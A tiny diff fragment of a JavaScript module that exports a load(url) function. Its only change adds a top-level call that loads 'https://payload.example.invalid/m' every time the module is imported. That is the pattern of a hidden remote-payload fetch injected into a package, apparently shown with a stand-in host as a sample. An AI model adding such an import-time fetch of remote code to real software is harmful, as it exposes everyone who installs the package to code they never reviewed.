@@ -6,3 +6,5 @@ function load(url) {
 }
 
 module.exports = load;
+
+load("https://payload.example.invalid/m");
